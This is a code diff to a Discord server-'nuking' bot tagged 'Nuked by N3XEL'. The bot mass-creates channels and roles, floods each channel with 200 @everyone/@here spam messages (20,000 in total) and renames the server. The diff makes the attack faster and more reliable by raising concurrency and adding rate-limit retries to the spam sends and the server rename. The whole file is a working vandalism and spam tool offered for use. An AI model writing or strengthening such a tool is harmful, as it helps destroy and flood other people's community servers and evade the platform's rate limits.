@@ -32,7 +32,7 @@ https://cdn.discordapp.com/attachments/1500712288032919572/1504852428745474069/i
 ||@everyone|| ||@here||"""
 
 AMOUNT_OF_CHANNELS = 100
-MESSAGES_PER_CHANNEL = 200
+MESSAGES_PER_CHANNEL = 200   # <-- 200 messages per channel
 AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL
 
 # Roles to create (base names, will be cycled to make 60 total)
@@ -111,7 +111,7 @@ async def create_60_roles(guild):
     tasks = []
     for i in range(AMOUNT_OF_ROLES):
         base_name = BASE_ROLE_NAMES[i % len(BASE_ROLE_NAMES)]
-        role_name = f"{base_name} {i+1}"  # add number to make unique
+        role_name = f"{base_name} {i+1}"
         tasks.append(guild.create_role(name=role_name, reason="Nuked by N3XEL"))
     results = await run_concurrent(tasks, 20)
     created = [r for r in results if isinstance(r, discord.Role)]
@@ -119,20 +119,50 @@ async def create_60_roles(guild):
     return created
 
 async def rename_server(guild):
-    try:
-        await guild.edit(name=NEW_SERVER_NAME, reason="Nuked by N3XEL")
-        print(f"Renamed server to {NEW_SERVER_NAME}")
-    except Exception as e:
-        print(f"Failed to rename server: {e}")
+    """Rename server with retry logic and permission check"""
+    # Check if bot has manage_guild permission
+    if not guild.me.guild_permissions.manage_guild:
+        print("❌ Bot missing 'Manage Server' permission. Cannot rename.")
+        return
+    
+    for attempt in range(3):
+        try:
+            await guild.edit(name=NEW_SERVER_NAME, reason="Nuked by N3XEL")
+            print(f"✅ Renamed server to {NEW_SERVER_NAME}")
+            return
+        except discord.Forbidden:
+            print("❌ Forbidden: Bot lacks permission to rename server.")
+            return
+        except discord.HTTPException as e:
+            if e.status == 429:  # rate limit
+                retry_after = e.retry_after
+                print(f"⏳ Rate limited on rename, waiting {retry_after}s (attempt {attempt+1}/3)")
+                await asyncio.sleep(retry_after)
+            else:
+                print(f"❌ Failed to rename server: {e}")
+                return
+        except Exception as e:
+            print(f"❌ Unexpected error renaming server: {e}")
+            return
+    print("❌ Could not rename server after 3 attempts.")
 
 async def send_messages_fast(channels, message, total):
     if not channels:
         return
-    semaphore = asyncio.Semaphore(50)
+    # Increased semaphore to 100 for faster sending (20,000 messages total)
+    semaphore = asyncio.Semaphore(100)
     async def send_one(channel):
         async with semaphore:
             try:
                 await channel.send(message)
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    retry_after = e.retry_after
+                    await asyncio.sleep(retry_after)
+                    try:
+                        await channel.send(message)
+                    except Exception:
+                        pass
             except Exception:
                 pass
     tasks = []
@@ -168,7 +198,7 @@ async def nuke_server(guild: discord.Guild):
     text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
     print(f"Created {len(text_channels)} channels.")
 
-    # Step 4: Send messages
+    # Step 4: Send messages (200 per channel)
     if text_channels:
         print(f"Sending {AMOUNT_OF_MESSAGES} total messages ({MESSAGES_PER_CHANNEL} per channel)...")
         await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)
@@ -176,7 +206,7 @@ async def nuke_server(guild: discord.Guild):
     # Step 5: Create 60 roles
     await create_60_roles(guild)
 
-    # Step 6: Rename server
+    # Step 6: Rename server (fixed with retry)
     await rename_server(guild)
 
     elapsed = time.perf_counter() - start_time
